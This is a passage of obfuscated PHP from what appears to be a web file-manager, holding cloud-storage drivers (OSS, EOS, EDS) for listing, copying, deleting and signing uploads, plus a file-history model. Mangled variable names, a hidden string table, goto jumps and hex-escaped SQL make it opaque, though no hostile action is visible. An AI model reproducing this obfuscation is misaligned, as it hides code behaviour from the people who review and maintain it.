array($Ñ—ÁÜê„[554] => $Ñç¿³ºÂ[$Ñ—ÁÜê„[554]], $Ñ—ÁÜê„[79] => $Ñç¿³ºÂ[$Ñ—ÁÜê„[79]], $Ñ—ÁÜê„[88] => time(), $Ñ—ÁÜê„[540] => USER_ID); Model($Ñ—ÁÜê„[911])->where(array($Ñ—ÁÜê„[194] => $Ö½éÃ£™))->save($º¿Üµ£«); return $this->where(array($Ñ—ÁÜê„[504] => $ñ©ê“Í™))->delete(); } public function clearSame($ç“¯³Á) { $ìÓƒ×ø =& $_SERVER[®»±”ó²]; $ñ–È…³¼ = $this->listData($ç“¯³Á); $›È ç—€ = array_to_keyvalue_group($ñ–È…³¼, $ìÓƒ×ø[554]); $÷¤À¬ä = array(); $ÓûÍÄÚ = array(); foreach ($›È ç—€ as $­¶µ·÷½) { if (!$­¶µ·÷½ || count($­¶µ·÷½) <= 1) { continue; } foreach ($­¶µ·÷½ as $şÁéò€ˆ) { $÷¤À¬ä[] = $şÁéò€ˆ[$ìÓƒ×ø[554]]; $ÓûÍÄÚ[] = $şÁéò€ˆ[$ìÓƒ×ø[477]]; } } if (!$ÓûÍÄÚ) { return; } $this->where(array($ìÓƒ×ø[477] => array($ìÓƒ×ø[7], $ÓûÍÄÚ)))->delete(); Model($ìÓƒ×ø[557])->remove($÷¤À¬ä); } public function userSpace() { $ Û½Ã´€ =& $_SERVER[®»±”ó²]; $ Ë…ùÄ = $this->tablePrefix; $éË¥íñÄ = array($ Û½Ã´€[1782] => USER_ID); $€ «à» = "{$ Ë…ùÄ}\x69\157\137\x66\x69\x6c\x65\x20\x66\x69\154\145\163\x20\157\156\40\x66\151\x6c\145\x73\56\x66\x69\154\x65\111\104\40\x3d\40\x68\151\163\164\157\162\171\x2e\x66\x69\x6c\145\111\104"; return $this->alias($ Û½Ã´€[2253])->where($éË¥íñÄ)->join($€ «à», $ Û½Ã´€[2254])->sum($ Û½Ã´€[79]); } } goto BùÚå³¥±º; Aï®Ş¦ô: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($şƒıŸÒ§) { $this->pathParse = $şƒıŸÒ§; } protected function infoParse($•¤ò³òœ, $¦™¯â¿³ = false) { $’ˆ˜‰Ã =& $_SERVER[®»±”ó²]; return Action($’ˆ˜‰Ã[1268])->sharePathInfo($this->pathParse[$’ˆ˜‰Ã[87]], !0, $¦™¯â¿³); } public function listPath($–æßÊ­ş, $Ï‹ïæä = false) { $º¤£Ëïä =& $_SERVER[®»±”ó²]; $ôÊË”ùò = IO::listPath($–æßÊ­ş, $Ï‹ïæä); if (!$ôÊË”ùò) { return $ôÊË”ùò; } if (is_array($ôÊË”ùò[$º¤£Ëïä[1448]])) { $İÇÃ¢ÛÚ = Action($º¤£Ëïä[1457])->parsePathChildren($ôÊË”ùò[$º¤£Ëïä[1448]], array($º¤£Ëïä[506] => $–æßÊ­ş)); $ôÊË”ùò[$º¤£Ëïä[1448]] = Action($º¤£Ëïä[1268])->shareItemInfo($İÇÃ¢ÛÚ); } foreach ($ôÊË”ùò as $Úäşàâ­ => $€ƒº¸Ê) { if (!in_array($Úäşàâ­, array($º¤£Ëïä[86], $º¤£Ëïä[85]))) { continue; } foreach ($€ƒº¸Ê as $÷¯½†ÍÃ => $İÇÃ¢ÛÚ) { $İÇÃ¢ÛÚ = Action($º¤£Ëïä[1457])->parsePathChildren($İÇÃ¢ÛÚ, array($º¤£Ëïä[506] => $–æßÊ­ş)); $ôÊË”ùò[$Úäşàâ­][$÷¯½†ÍÃ] = Action($º¤£Ëïä[1268])->shareItemInfo($İÇÃ¢ÛÚ); } } return $ôÊË”ùò; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($Öã¨ÂÕƒ) { parent::__construct($Öã¨ÂÕƒ); $this->setSignVersion($_SERVER[®»±”ó²][250]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Ş©«ì«) { parent::__construct($Ş©«ì«); $this->setSignVersion($_SERVER[®»±”ó²][250]); } public function uploadFormData($‹¨‡°Ó¡, $÷ÎÑ¿“‹ = 3600) { $ˆéã¢ìô =& $_SERVER[®»±”ó²]; $Ì–æÑÎÒ = $ˆéã¢ìô[232]; $ĞÀß¤‚ = $ˆéã¢ìô[260]; $·—İïÁ = $ˆéã¢ìô[62]; $äË¤Ÿ¤ = gmdate($ˆéã¢ìô[261]); $Í¬Şî¤½ = gmdate($ˆéã¢ìô[262]); $ƒÁíË‰ø = $ˆéã¢ìô[263]; $ÆËßØœŒ = $÷ÎÑ¿“‹ . $ˆéã¢ìô[12]; $Âû¸ó‹® = $ˆéã¢ìô[264]; $ĞøÛ¡×ô = array($this->accessKey, $Í¬Şî¤½, $this->region, $·—İïÁ, $ƒÁíË‰ø); $ŞÏµÚËŞ = implode($ˆéã¢ìô[8], $ĞøÛ¡×ô); $ğµ«ÜÛ… = array($ˆéã¢ìô[265] => gmdate($ˆéã¢ìô[1432], strtotime($ˆéã¢ìô[267])), $ˆéã¢ìô[268] => array(array($ˆéã¢ìô[269] => $this->bucket), array($ˆéã¢ìô[309] => $Ì–æÑÎÒ), array($ˆéã¢ìô[270], $ˆéã¢ìô[271], $ˆéã¢ìô[12]), array($ˆéã¢ìô[270], $ˆéã¢ìô[272], $ˆéã¢ìô[12]), array($ˆéã¢ìô[270], $ˆéã¢ìô[310], $ˆéã¢ìô[12]), array($ˆéã¢ìô[273] => $Âû¸ó‹®), array($ˆéã¢ìô[274] => $ŞÏµÚËŞ), array($ˆéã¢ìô[275] => $ĞÀß¤‚), array($ˆéã¢ìô[276] => $äË¤Ÿ¤), array($ˆéã¢ìô[277] => $ÆËßØœŒ))); $°È½îà = base64_encode(json_encode($ğµ«ÜÛ…)); $Ìî§¦çš = hash_hmac($ˆéã¢ìô[278], $Í¬Şî¤½, $ˆéã¢ìô[279] . $this->secret, !0); $§¡Ç²° = hash_hmac($ˆéã¢ìô[278], $this->region, $Ìî§¦çš, !0); $©‹½èŞ = hash_hmac($ˆéã¢ìô[278], $·—İïÁ, $§¡Ç²°, !0); $ÈÇŒ€Ì = hash_hmac($ˆéã¢ìô[278], $ƒÁíË‰ø, $©‹½èŞ, !0); $ª‘ÍØ‡£ = hash_hmac($ˆéã¢ìô[278], $°È½îà, $ÈÇŒ€Ì); $í“ĞÁÓ = array($ˆéã¢ìô[249] => $ˆéã¢ìô[12], $ˆéã¢ìô[297] => $ˆéã¢ìô[12], $ˆéã¢ìô[309] => $Ì–æÑÎÒ, $ˆéã¢ìô[273] => $Âû¸ó‹®, $ˆéã¢ìô[280] => $°È½îà, $ˆéã¢ìô[311] => $ŞÏµÚËŞ, $ˆéã¢ìô[312] => $ĞÀß¤‚, $ˆéã¢ìô[313] => $äË¤Ÿ¤, $ˆéã¢ìô[314] => $ÆËßØœŒ, $ˆéã¢ìô[315] => $ª‘ÍØ‡£, $ˆéã¢ìô[209] => $this->getHost()); return $í“ĞÁÓ; } } goto Fôñ ´µ˜ò; D¸ÚÅ¥™™Û: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($¡¥æ÷º›) { parent::__construct(); include_once SDK_DIR . $_SERVER[®»±”ó²][1482]; $this->_init($¡¥æ÷º›); } public function _init($Â˜óÎª™) { $‰Ã²‡Ş =& $_SERVER[®»±”ó²]; $this->config = $Â˜óÎª™; foreach ($Â˜óÎª™ as $Êş¼¨ŠŒ => $Á¿á÷¶) { if (isset($this->{$Êş¼¨ŠŒ})) { $this->{$Êş¼¨ŠŒ} = $Á¿á÷¶; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($‰Ã²‡Ş[1483] . LNG($‰Ã²‡Ş[1484])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ÀÂŞ =& $_SERVER[®»±”ó²]; $êÔâ›ê = new OSS\Model\CorsConfig(); $×€èá›Ø = new OSS\Model\CorsRule(); $×€èá›Ø->addAllowedOrigin($ÀÂŞ[1485]); $×€èá›Ø->addAllowedMethod($ÀÂŞ[1486]); $×€èá›Ø->addAllowedMethod($ÀÂŞ[1487]); $×€èá›Ø->addAllowedMethod($ÀÂŞ[1488]); $×€èá›Ø->addAllowedMethod($ÀÂŞ[1489]); $×€èá›Ø->addAllowedMethod($ÀÂŞ[165]); $×€èá›Ø->setMaxAgeSeconds(600); $×€èá›Ø->addExposeHeader($ÀÂŞ[1490]); $×€èá›Ø->addAllowedHeader($ÀÂŞ[1485]); $êÔâ›ê->addRule($×€èá›Ø); try { $this->client->putBucketCors($this->bucket, $êÔâ›ê); } catch (OSS\Core\OssException $ƒò±¨àâ) { $this->writeLog(__FUNCTION__ . $ÀÂŞ[215] . $ƒò±¨àâ->getMessage()); return !1; } return !0; } public function getBucketCors() { $÷ºí¶ÙÁ =& $_SERVER[®»±”ó²]; $ö¬şŞó = null; try { $ö¬şŞó = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ÀüÚïâİ) { $this->writeLog(__FUNCTION__ . $÷ºí¶ÙÁ[215] . $ÀüÚïâİ->getMessage()); return null; } if (!$ö¬şŞó || !($­õ‡ü¥Í = $ö¬şŞó->getRules())) { return null; } $ğ’¼âŸ = $­õ‡ü¥Í[0]->getAllowedOrigins(); $Òö‘ãåï = $­õ‡ü¥Í[0]->getAllowedMethods(); $©”„ø‘ = $­õ‡ü¥Í[0]->getMaxAgeSeconds(); $âéòÅ˜÷ = $­õ‡ü¥Í[0]->getExposeHeaders(); $Î­ÜğÍ = $­õ‡ü¥Í[0]->getAllowedHeaders(); return array($÷ºí¶ÙÁ[221] => isset($ğ’¼âŸ[0]) ? $ğ’¼âŸ[0] : $÷ºí¶ÙÁ[12], $÷ºí¶ÙÁ[225] => $Òö‘ãåï, $÷ºí¶ÙÁ[1491] => $©”„ø‘, $÷ºí¶ÙÁ[1492] => isset($âéòÅ˜÷[0]) ? $âéòÅ˜÷[0] : $÷ºí¶ÙÁ[12], $÷ºí¶ÙÁ[222] => isset($Î­ÜğÍ[0]) ? $Î­ÜğÍ[0] : $÷ºí¶ÙÁ[12]); } public function isBucketCors() { $É–¨ğ½ =& $_SERVER[®»±”ó²]; $üì¶îû­ = $this->getBucketCors(); if (!$üì¶îû­ || !is_array($üì¶îû­)) { return !1; } if ($üì¶îû­[$É–¨ğ½[221]] != $É–¨ğ½[223] || $üì¶îû­[$É–¨ğ½[222]] != $É–¨ğ½[223]) { return !1; } $½ŠŠŞ† = array_map($É–¨ğ½[224], $üì¶îû­[$É–¨ğ½[225]]); if (!is_array($½ŠŠŞ†)) { $½ŠŠŞ† = array(); } $±ëîˆ£ = array($É–¨ğ½[226], $É–¨ğ½[227], $É–¨ğ½[228], $É–¨ğ½[229], $É–¨ğ½[230]); $Ï£ãøæ = array_diff($±ëîˆ£, $½ŠŠŞ†); return empty($Ï£ãøæ); } public function mkfile($ÚĞëÔº, $§ûìğ“Ê = '', $É©×”Å = REPEAT_RENAME) { $úÖ“÷ŒÆ = $this->setContent($ÚĞëÔº, $§ûìğ“Ê); if ($úÖ“÷ŒÆ !== !1) { return $this->getPathOuter($ÚĞëÔº); } return !1; } public function mkdir($°±‡À÷, $‚‚€Ö°¾ = REPEAT_SKIP) { if ($‚‚€Ö°¾ && $this->_isFolder($°±‡À÷)) { return $this->getPathOuter($°±‡À÷); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($°±‡À÷)); } catch (OSS\Core\OssException $ïğù´) { $this->writeLog(__FUNCTION__ . $_SERVER[®»±”ó²][215] . $ïğù´->getMessage()); return !1; } return $this->getPathOuter($°±‡À÷); } private function fileList($¯È‹Í‘û, $€Èµºµ¥ = '', $ò†ïüâ = 0) { $ï¹¬„µÄ =& $_SERVER[®»±”ó²]; $¯È‹Í‘û = trim($¯È‹Í‘û, $ï¹¬„µÄ[8]); $şÔ¨¾ÓÙ = empty($¯È‹Í‘û) && $¯È‹Í‘û !== $ï¹¬„µÄ[231] ? $ï¹¬„µÄ[12] : $¯È‹Í‘û . $ï¹¬„µÄ[8]; $‡ŒïÇ¹Å = $ï¹¬„µÄ[12]; $¡¨É»² = 1000; $–‘®ùÜå = $€‚„½ß– = array(); while (!0) { check_abort(); $¬ç×À­ = array($ï¹¬„µÄ[1493] => $€Èµºµ¥, $ï¹¬„µÄ[1494] => $şÔ¨¾ÓÙ, $ï¹¬„µÄ[1495] => $¡¨É»², $ï¹¬„µÄ[1496] => $‡ŒïÇ¹Å); try { $şŠ«ı£ = $this->client->listObjects($this->bucket, $¬ç×À­); } catch (OSS\Core\OssException $¼™Ú™—†) { $this->writeLog(__FUNCTION__ . $ï¹¬„µÄ[215] . $¼™Ú™—†->getMessage()); break; } $‡ŒïÇ¹Å = $şŠ«ı£->getNextMarker(); $•Á¥šŒ³ = $şŠ«ı£->getObjectList(); $óáş‰ïÁ = $şŠ«ı£->getPrefixList(); foreach ($•Á¥šŒ³ as $ØÕ·½šî) { if ($ØÕ·½šî->getKey() == $şÔ¨¾ÓÙ) { continue; } $€ì‚…šü = $ØÕ·½šî->getKey(); $’‘ÜŞ½ = $ØÕ·½šî->getSize(); $Ó¤°¨û† = $ØÕ·½šî->getLastModified(); $‘·–ì‚Ÿ = trim($ØÕ·½šî->getETag(), $ï¹¬„µÄ[121]); $Æ‹ı«ˆ× = $ò†ïüâ ? array($ï¹¬„µÄ[32] => $€ì‚…šü, $ï¹¬„µÄ[79] => $’‘ÜŞ½, $ï¹¬„µÄ[207] => strtotime($Ó¤°¨û†), $ï¹¬„µÄ[1497] => $‘·–ì‚Ÿ) : $€ì‚…šü; $ê¦ïê›à = $’‘ÜŞ½ == 0 && substr($€ì‚…šü, strlen($€ì‚…šü) - 1, 1) == $ï¹¬„µÄ[8] ? !0 : !1; $Ö¼ÅØğä = array($ï¹¬„µÄ[79] => $’‘ÜŞ½, $ï¹¬„µÄ[1498] => $’‘ÜŞ½, $ï¹¬„µÄ[88] => strtotime($Ó¤°¨û†), $ï¹¬„µÄ[1499] => $Ó¤°¨û†, $ï¹¬„µÄ[1497] => $‘·–ì‚Ÿ); $this->cacheMethodInfoSet($€ì‚…šü, $ê¦ïê›à, $Ö¼ÅØğä); if ($ê¦ïê›à) { $–‘®ùÜå[] = $€ì‚…šü; continue; } $€‚„½ß–[] = $Æ‹ı«ˆ×; } foreach ($óáş‰ïÁ as $ò¥êÁóº) { $–‘®ùÜå[] = $ò¥êÁóº->getPrefix(); $this->cacheMethodInfoSet($ò¥êÁóº->getPrefix(), !0); } if ($‡ŒïÇ¹Å === $ï¹¬„µÄ[12]) { break; } } $this->cacheMethodInfoSet($¯È‹Í‘û, !0); return array($ï¹¬„µÄ[85] => $–‘®ùÜå, $ï¹¬„µÄ[86] => $€‚„½ß–); } public function listObject($Õ‹™ÏÃ€, $Ë±èß”¯ = '') { $Ä©¢åùí =& $_SERVER[®»±”ó²]; $Õ‹™ÏÃ€ = trim($Õ‹™ÏÃ€, $Ä©¢åùí[8]); $ı¨ˆ®Ø½ = empty($Õ‹™ÏÃ€) && $Õ‹™ÏÃ€ !== $Ä©¢åùí[231] ? $Ä©¢åùí[12] : $Õ‹™ÏÃ€ . $Ä©¢åùí[8]; $·æİæ€â = $Ä©¢åùí[12]; $¿Î§æ‚‚ = 1000; $”ôœ”Ôæ = $ÅÛŞĞ»¶ = array(); while (!0) { check_abort(); $¬ûÅ“ö = array($Ä©¢åùí[1493] => $Ë±èß”¯, $Ä©¢åùí[1494] => $ı¨ˆ®Ø½, $Ä©¢åùí[1495] => $¿Î§æ‚‚, $Ä©¢åùí[1496] => $·æİæ€â); try { $§À°ô¬€ = $this->client->listObjects($this->bucket, $¬ûÅ“ö); } catch (OSS\Core\OssException $ÚĞŸ¾ÊÀ) { $this->writeLog(__FUNCTION__ . $Ä©¢åùí[215] . $ÚĞŸ¾ÊÀ->getMessage()); break; } $·æİæ€â = $§À°ô¬€->getNextMarker(); $¯¼êèë = $§À°ô¬€->getObjectList(); foreach ($¯¼êèë as $ê¿à´ç) { if ($ê¿à´ç->getKey() == $ı¨ˆ®Ø½) { continue; } $İÏÕá°½ = $ê¿à´ç->getKey(); $÷‰ØÙââ = $ê¿à´ç->getSize(); $™›ŸÚÙ€ = $÷‰ØÙââ == 0 && substr($İÏÕá°½, strlen($İÏÕá°½) - 1, 1) == $Ä©¢åùí[8] ? !0 : !1; if ($™›ŸÚÙ€) { continue; } $ÅÛŞĞ»¶[] = $÷‰ØÙââ . $Ä©¢åùí[215] . $İÏÕá°½; } if ($·æİæ€â === $Ä©¢åùí[12]) { break; } } return array($Ä©¢åùí[85] => $”ôœ”Ôæ, $Ä©¢åùí[86] => $ÅÛŞĞ»¶); } public function copyFile($­ÑˆÂ‚À, $®„øÏûÅ) { $·€õù¶¶ = $this->size($­ÑˆÂ‚À); if ($·€õù¶¶ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $­ÑˆÂ‚À, $this->bucket, $this->pathEncode($®„øÏûÅ)); } catch (OSS\Core\OssException $ìÚ½ıû³) { $this->writeLog(__FUNCTION__ . $_SERVER[®»±”ó²][215] . $ìÚ½ıû³->getMessage()); return !1; } return $this->getPathOuter($®„øÏûÅ); } $¾¥à¡í = $this->multiCopyObject($­ÑˆÂ‚À, $®„øÏûÅ, $·€õù¶¶); return $¾¥à¡í ? $this->getPathOuter($®„øÏûÅ) : !1; } private function multiCopyObject($ÍÓ¤Úíº, $Ô–İÅÂÇ, $«¼×àüÕ) { $ªÅ­ÎØ€ =& $_SERVER[®»±”ó²]; try { $û¥ÑÔ¿· = array(); if ($•‹à‰ôÃ = $this->hashMd5($ÍÓ¤Úíº)) { $û¥ÑÔ¿· = array(OSS\OssClient::OSS_HEADERS => array($ªÅ­ÎØ€[1500] => $•‹à‰ôÃ)); } $ûËöŒ¢¢ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ô–İÅÂÇ), $û¥ÑÔ¿·); $Â››–¶Õ = 1; $ÊÃ»ı = 0; $¢ÑèÕ = array(); $±è¥Ü“ = 1024 * 1024 * 10; $º°ÀõîÙ = $this->client->generateMultiuploadParts($«¼×àüÕ, $±è¥Ü“); foreach ($º°ÀõîÙ as $ĞÈ¾¢ù => $Š›ÔòÑİ) { $‚ÜÏ–ØÜ = $ÊÃ»ı + (int) $Š›ÔòÑİ[$ªÅ­ÎØ€[1501]]; $œ‘’äµ® = (int) $Š›ÔòÑİ[$ªÅ­ÎØ€[414]] + $‚ÜÏ–ØÜ - 1; $Å›äÙ® = array($ªÅ­ÎØ€[167] => $‚ÜÏ–ØÜ, $ªÅ­ÎØ€[168] => $œ‘’äµ®); $¢ÑèÕ[] = $this->client->uploadPartCopy($this->bucket, $ÍÓ¤Úíº, $this->bucket, $this->pathEncode($Ô–İÅÂÇ), $Â››–¶Õ, $ûËöŒ¢¢, $Å›äÙ®); $Â››–¶Õ = $Â››–¶Õ + 1; } $ËÑª‘¾ = array(); foreach ($¢ÑèÕ as $ĞÈ¾¢ù => $óòù²É†) { $ËÑª‘¾[] = array($ªÅ­ÎØ€[300] => $ĞÈ¾¢ù + 1, $ªÅ­ÎØ€[301] => $óòù²É†); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Ô–İÅÂÇ), $ûËöŒ¢¢, $ËÑª‘¾); } catch (OSS\Core\OssException $ÔïÃ‘ö­) { $this->writeLog(__FUNCTION__ . $ªÅ­ÎØ€[215] . $ÔïÃ‘ö­->getMessage()); return !1; } return !0; } public function moveFile($·´ó ¶Ç, $ñ·íø) { if ($this->copyFile($·´ó ¶Ç, $ñ·íø)) { $this->remove($·´ó ¶Ç); return $this->getPathOuter($ñ·íø); } return !1; } public function delFile($Î§®½™ı) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Î§®½™ı)); } catch (OSS\Core\OssException $Ñ¬´¥“ƒ) { $this->writeLog(__FUNCTION__ . $_SERVER[®»±”ó²][215] . $Ñ¬´¥“ƒ->getMessage()); return !1; } return !0; } public function delFolder($ÀØ¿ÜÃ) { $•Ã¤Ü×î =& $_SERVER[®»±”ó²]; if (!$this->exist($ÀØ¿ÜÃ)) { return !0; } $this->listItemCache = !1; $í§âÄ‚ç = $this->fileList($ÀØ¿ÜÃ); $this->listItemCache = !0; $ËïÀ’à¥ = trim($ÀØ¿ÜÃ, $•Ã¤Ü×î[8]) . $•Ã¤Ü×î[8]; if (!empty($ÀØ¿ÜÃ) && $ÀØ¿ÜÃ !== $•Ã¤Ü×î[231] && !in_array($ËïÀ’à¥, $í§âÄ‚ç[$•Ã¤Ü×î[85]])) { $í§âÄ‚ç[$•Ã¤Ü×î[85]][] = $ËïÀ’à¥; } $ Ø½‘ˆ‰ = $this->delByBatch($í§âÄ‚ç[$•Ã¤Ü×î[86]]); if (!$ Ø½‘ˆ‰) { return !1; } $ Ø½‘ˆ‰ = $this->delByBatch($í§âÄ‚ç[$•Ã¤Ü×î[85]]); if (!$ Ø½‘ˆ‰) { return !1; } return $this->delFile($ËïÀ’à¥); } private function delByBatch($×™ä–ãŠ) { foreach (array_chunk($×™ä–ãŠ, 1000) as $‡àû©á’) { try { $this->client->deleteObjects($this->bucket, $‡àû©á’); } catch (OSS\Core\OssException $äŞëË€¹) { $this->writeLog(__FUNCTION__ . $_SERVER[®»±”ó²][215] . $äŞëË€¹->getMessage()); return !1; } } return !0; } public function rename($ÊÖï´œƒ, $ŞàØ™È‡) { return $this->renameObject($ÊÖï´œƒ, $ŞàØ™È‡); } private function fileInfo($øñö Æ, $ŒÌ ªõ· = false, $óˆ™¶¨æ = array()) { $÷ùóŸÀ =& $_SERVER[®»±”ó²]; $ÙÆÁÖîİ = array($÷ùóŸÀ[32] => $this->pathThis($øñö Æ), $÷ùóŸÀ[87] => $this->getPathOuter($øñö Æ), $÷ùóŸÀ[33] => $÷ùóŸÀ[233], $÷ùóŸÀ[79] => isset($óˆ™¶¨æ[$÷ùóŸÀ[79]]) ? $óˆ™¶¨æ[$÷ùóŸÀ[79]] : 0, $÷ùóŸÀ[169] => $this->ext($øñö Æ)); if ($ŒÌ ªõ·) { return $ÙÆÁÖîİ; } $ÙÆÁÖîİ[$÷ùóŸÀ[234]] = $ÙÆÁÖîİ[$÷ùóŸÀ[88]] = 0; $ÙÆÁÖîİ[$÷ùóŸÀ[235]] = $ÙÆÁÖîİ[$÷ùóŸÀ[236]] = !0; if (empty($óˆ™¶¨æ)) { $±¡·¯âÒ = $this->objectMeta($øñö Æ); if (!$±¡·¯âÒ) { return $ÙÆÁÖîİ; } $óˆ™¶¨æ = array($÷ùóŸÀ[88] => strtotime($±¡·¯âÒ[$÷ùóŸÀ[1499]]), $÷ùóŸÀ[79] => $±¡·¯âÒ[$÷ùóŸÀ[1498]] + 0, $÷ùóŸÀ[1497] => $±¡·¯âÒ[$÷ùóŸÀ[1497]]); } if (isset($óˆ™¶¨æ[$÷ùóŸÀ[1497]]) && $óˆ™¶¨æ[$÷ùóŸÀ[1497]]) { $ÙÆÁÖîİ[$÷ùóŸÀ[238]] = trim($óˆ™¶¨æ[$÷ùóŸÀ[1497]], $÷ùóŸÀ[121]); } if (isset($óˆ™¶¨æ[$÷ùóŸÀ[79]])) { $ÙÆÁÖîİ[$÷ùóŸÀ[79]] = $óˆ™¶¨æ[$÷ùóŸÀ[79]]; } if (isset($óˆ™¶¨æ[$÷ùóŸÀ[88]])) { $ÙÆÁÖîİ[$÷ùóŸÀ[88]] = $óˆ™¶¨æ[$÷ùóŸÀ[88]]; } if (isset($óˆ™¶¨æ[$÷ùóŸÀ[207]]) && !trim($ÙÆÁÖîİ[$÷ùóŸÀ[88]])) { $ÙÆÁÖîİ[$÷ùóŸÀ[88]] = $óˆ™¶¨æ[$÷ùóŸÀ[207]]; } return $ÙÆÁÖîİ; } private function folderInfo($Öµß®, $ÃÉ…·´™ = false, $Ç¨ƒÄ¢ = array()) { $ûÌóØÄ =& $_SERVER[®»±”ó²]; $ÔÂ«¢’  = array($ûÌóØÄ[32] => $this->pathThis($Öµß®), $ûÌóØÄ[87] => $this->getPathOuter($ûÌóØÄ[8] . $Öµß®), $ûÌóØÄ[33] => $ûÌóØÄ[78]); if ($ÃÉ…·´™) { return $ÔÂ«¢’ ; } $ÔÂ«¢’ [$ûÌóØÄ[234]] = $ÔÂ«¢’ [$ûÌóØÄ[88]] = 0; $ÔÂ«¢’ [$ûÌóØÄ[235]] = $ÔÂ«¢’ [$ûÌóØÄ[236]] = !0; if (empty($Ç¨ƒÄ¢)) { $Öµß® = rtrim($Öµß®, $ûÌóØÄ[8]) . $ûÌóØÄ[8]; $”Ë¬Ã² = $this->objectMeta($Öµß®); if (!$”Ë¬Ã²) { return $ÔÂ«¢’ ; } $Ç¨ƒÄ¢ = array($ûÌóØÄ[234] => $”Ë¬Ã²[$ûÌóØÄ[588]][$ûÌóØÄ[1502]], $ûÌóØÄ[88] => strtotime($”Ë¬Ã²[$ûÌóØÄ[1499]])); } if (isset($Ç¨ƒÄ¢[$ûÌóØÄ[88]])) { $ÔÂ«¢’ [$ûÌóØÄ[88]] = $Ç¨ƒÄ¢[$ûÌóØÄ[88]]; } if (isset($Ç¨ƒÄ¢[$ûÌóØÄ[234]])) { $ÔÂ«¢’ [$ûÌóØÄ[234]] = $Ç¨ƒÄ¢[$ûÌóØÄ[234]]; } return $ÔÂ«¢’ ; } public function listPath($…Ç ±ü, $ÎÃ·éåï = false) { $ÙÜ¦î¯¹ =& $_SERVER[®»±”ó²]; $ÃÌÏÚ«… = $this->fileList($…Ç ±ü, $ÙÜ¦î¯¹[8], !0); foreach ($ÃÌÏÚ«…[$ÙÜ¦î¯¹[85]] as $‹ãîËÛû => $‹ñ»ÜÒù) { $ÃÌÏÚ«…[$ÙÜ¦î¯¹[85]][$‹ãîËÛû] = $this->folderInfo($‹ñ»ÜÒù, $ÎÃ·éåï, $‹ñ»ÜÒù); } foreach ($ÃÌÏÚ«…[$ÙÜ¦î¯¹[86]] as $‹ãîËÛû => $‹ñ»ÜÒù) { $ÃÌÏÚ«…[$ÙÜ¦î¯¹[86]][$‹ãîËÛû] = $this->fileInfo($‹ñ»ÜÒù[$ÙÜ¦î¯¹[32]], $ÎÃ·éåï, $‹ñ»ÜÒù); } return $ÃÌÏÚ«…; } protected function infoChildren($¤Õ¥õ¥Ë, &$ëúİÛƒ§) { $ÈĞˆ¼¼ =& $_SERVER[®»±”ó²]; $ëç°ĞöŒ = $this->fileList($¤Õ¥õ¥Ë, $ÈĞˆ¼¼[12], !0); $ëúİÛƒ§[$ÈĞˆ¼¼[81]] += count($ëç°ĞöŒ[$ÈĞˆ¼¼[85]]); $ëúİÛƒ§[$ÈĞˆ¼¼[80]] += count($ëç°ĞöŒ[$ÈĞˆ¼¼[86]]); foreach ($ëç°ĞöŒ[$ÈĞˆ¼¼[86]] as $¢¡·ÅÔË) { if (!$¢¡·ÅÔË || !$¢¡·ÅÔË[$ÈĞˆ¼¼[79]]) { continue; } $ëúİÛƒ§[$ÈĞˆ¼¼[79]] += $¢¡·ÅÔË[$ÈĞˆ¼¼[79]]; } } public function has($¶ˆ€ùÎÉ, $©£»áß˜ = false, $¾ıÖª—â = true) { $ÈşÑş§Š =& $_SERVER[®»±”ó²]; $¶ˆ€ùÎÉ = trim($¶ˆ€ùÎÉ, $ÈşÑş§Š[8]); $¤äôò™á = empty($¶ˆ€ùÎÉ) && $¶ˆ€ùÎÉ !== $ÈşÑş§Š[231] ? $ÈşÑş§Š[12] : $¶ˆ€ùÎÉ . $ÈşÑş§Š[8]; $ºĞ¥ÉÚ = $ÈşÑş§Š[12]; $êí‹“Œí = 500; $²à–îªØ = $ÖÚÀ‡•¸ = 0; while (!0) { check_abort(); $«Äç§ = array($ÈşÑş§Š[1493] => $ÈşÑş§Š[8], $ÈşÑş§Š[1494] => $¤äôò™á, $ÈşÑş§Š[1495] => $êí‹“Œí, $ÈşÑş§Š[1496] => $ºĞ¥ÉÚ); try { $ É´ç = $this->client->listObjects($this->bucket, $«Äç§); } catch (OSS\Core\OssException $áì«¬ç) { $this->writeLog(__FUNCTION__ . $ÈşÑş§Š[215] . $áì«¬ç->getMessage()); break; } $ºĞ¥ÉÚ = $ É´ç->getNextMarker(); $¬öÀºà = $ É´ç->getObjectList(); $ä®’Ááî = $ É´ç->getPrefixList(); if ($©£»áß˜) { if (count($¬öÀºà) > 1 || count($¬öÀºà) == 1 && $¬öÀºà[0]->getKey() != $¤äôò™á) { $²à–îªØ += count($¬öÀºà) - 1; } if (!empty($ä®’Ááî)) { $ÖÚÀ‡•¸ += count($ä®’Ááî); } if ($ºĞ¥ÉÚ === $ÈşÑş§Š[12]) { break; } continue; } if ($¾ıÖª—â) { if (!empty($¬öÀºà)) { if (count($¬öÀºà) > 1 || $¬öÀºà[0]->getKey() != $¤äôò™á) { return !0; } } } else { if (!empty($ä®’Ááî)) { return !0; } } if ($ºĞ¥ÉÚ === $ÈşÑş§Š[12]) { break; } } if ($©£»áß˜) { return array($ÈşÑş§Š[242] => $²à–îªØ, $ÈşÑş§Š[243] => $ÖÚÀ‡•¸); } return !1; } public function listAll($Æî¬÷¹¬) { $±Ú‚Ë“ =& $_SERVER[®»±”ó²]; $Šû©É¸ = $this->fileList($Æî¬÷¹¬, $±Ú‚Ë“[12], !0); $­ÇÒûœ¢ = array_to_keyvalue($Šû©É¸[$±Ú‚Ë“[86]], $±Ú‚Ë“[32]); foreach ($Šû©É¸[$±Ú‚Ë“[85]] as $°–é•èŠ) { if (is_string($°–é•èŠ)) { 